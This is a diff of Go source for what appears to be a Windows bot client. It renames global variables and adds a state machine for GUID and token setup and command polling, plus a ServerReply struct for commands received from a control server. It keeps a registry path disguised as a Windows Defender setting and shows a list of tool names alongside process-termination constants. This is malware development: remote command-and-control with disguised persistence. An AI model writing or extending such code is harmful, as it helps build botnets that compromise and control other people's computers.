@@ -45,11 +45,11 @@ var (
 		"Cheat Engine",
 		"Sigma Engine",
 	}
-	seed = rand.New(rand.NewSource(time.Now().UTC().UnixNano()))
+	g_seed = rand.New(rand.NewSource(time.Now().UTC().UnixNano()))
 
-	guid    = ""
-	token   = ""
-	regpath = "Software/WinDefConfig"
+	g_guid    = ""
+	g_token   = ""
+	g_regpath = "Software/WinDefConfig"
 
 	// Dlls loading
 	user32   = syscall.NewLazyDLL("user32.dll")
@@ -87,6 +87,17 @@ const PROCESS_QUERY_INFORMATION = 0x0400
 const PROCESS_VM_READ = 0x0010
 const PROCESS_TERMINATE = 0x0001
 
+type BotState int
+
+const (
+	StateReadGuid BotState = iota
+	StateGenGuid
+	StateReadToken
+	StateRecoverPoll
+	StateCommandPoll
+	StateError
+)
+
 type BotCore struct {
 	hosts        []string
 	singleton    bool
@@ -103,4 +114,13 @@ type BotCore struct {
 
 type Win32_Process struct {
 	Name string
+}
+
+type ServerReply struct {
+	Status  int               `json:"status"`
+	Cmd     string            `json:"cmd"`
+	TaskId  int64             `json:"taskid"`
+	Args    map[string]any    `json:"args"`
+	Error   string            `json:"error"`
+	Headers map[string]string `json:"-"`
 }
